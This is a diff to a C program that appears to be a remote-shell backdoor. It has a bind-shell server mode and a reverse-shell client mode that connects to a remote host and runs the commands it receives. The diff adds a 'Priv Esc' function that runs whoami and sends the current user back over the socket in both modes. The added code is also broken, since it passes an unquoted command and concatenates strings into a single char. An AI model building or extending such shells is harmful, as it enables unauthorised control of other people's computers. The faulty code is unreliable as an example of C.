@@ -41,6 +41,19 @@ void Help(char *name)
 }
 
 /*
+* Priv Esc Functionality
+*/
+
+void get_username(int sockfd){
+    char *username = doexec(whoami);
+    char greeting = "[+] Current user is: ";
+    strcat(greeting, username);
+    strcat(greeting, "\r\n");
+    send(sockfd, greeting, sizeof(char) * strlen(greeting), 0);
+
+}
+
+/*
 * Socket Functions
 */
 
@@ -62,6 +75,7 @@ int server(int port){
     int clientAddrSize = sizeof(clientAddr);
     client = accept(server, (SOCKADDR *)&clientAddr, &clientAddrSize);
     header(client);
+    get_username(client);
     command_prompt(client);
     while (recv(client, buffer, sizeof(buffer), 0) > 0) {
         char *ans = doexec(buffer);
@@ -87,6 +101,7 @@ int client(char *rhost, int port){
 
     client = connect(s, (struct sockaddr *)&server , sizeof(server));
     header(s);
+    get_username(s);
     command_prompt(s);
     char buffer[1024];
     while (recv(s, buffer, sizeof(buffer), 0) > 0) {
